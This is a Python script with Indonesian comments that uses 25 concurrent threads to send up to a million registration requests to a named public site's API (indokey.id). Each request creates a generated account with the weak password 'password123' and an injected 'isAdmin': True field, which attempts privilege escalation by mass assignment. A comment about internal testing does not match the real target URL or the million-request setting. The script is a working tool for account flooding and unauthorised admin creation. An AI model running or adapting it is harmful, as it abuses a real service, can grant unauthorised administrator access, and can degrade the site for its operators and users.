import requests
import json
import itertools
from concurrent.futures import ThreadPoolExecutor

# URL Endpoint Target (Pastikan diarahkan ke lingkungan pengujian internal Anda)
URL_TARGET = 'https://indokey.id/backend/api/auth/register.php'

# Konfigurasi Concurrency
JUMLAH_THREAD = 25          # Jumlah thread disesuaikan untuk memantau respon awal
MAKSIMAL_REQUEST = 1000000       # Menguji 5 request untuk melihat tampilan respon secara berurutan

def kirim_request_bot(data_kombinasi):
    nomor_urut, item = data_kombinasi
    string_acak = "".join(item)
    
    username = f"Nusantara_{string_acak}"
    email = f"Nusantara_{string_acak}@gmail.com"
    
    payload = {
        'username': username,
        'email': email,
        'password': 'password123',
        'isAdmin': True
    }
    
    headers = {
        'Content-Type': 'application/json'
    }
    
    try:
        # Mengirim data POST
        response = requests.post(URL_TARGET, data=json.dumps(payload), headers=headers, timeout=5)
        
        # Cetak langsung di sini agar respon langsung muncul di terminal tanpa tertunda
        if response.status_code in [200, 201]:
            print(f"[+] Akun {nomor_urut} berhasil dibuat -> {username} | HTTP {response.status_code}")
        else:
            print(f"[-] Akun {nomor_urut} gagal dibuat (Server merespon: {response.status_code} | Isi: {response.text.strip()})")
            
    except requests.exceptions.Timeout:
        print(f"[-] Akun {nomor_urut} gagal: Request timeout (Server terlalu lambat merespon)")
    except requests.exceptions.RequestException as e:
        print(f"[-] Akun {nomor_urut} gagal: Kendala Jaringan/Koneksi ({e})")

def main():
    karakter = "abcdefghijklmnopqrstuvwxyz0123456789"
    kombinasi_generator = itertools.product(karakter, repeat=6)
    
    # Menyiapkan data antrean tugas
    antrean_tugas = list(enumerate(itertools.islice(kombinasi_generator, MAKSIMAL_REQUEST), start=1))
    
    print(f"[+] Memulai simulasi bot dengan {JUMLAH_THREAD} thread...")
    print(f"[+] Menjalankan total {len(antrean_tugas)} antrean tugas...\n")
    
    # Eksekusi multithreading
    with ThreadPoolExecutor(max_workers=JUMLAH_THREAD) as executor:
        # executor.submit digunakan untuk mengirim tugas ke thread tanpa menahan output
        for tugas in antrean_tugas:
            executor.submit(kirim_request_bot, tugas)

if __name__ == "__main__":
    main()
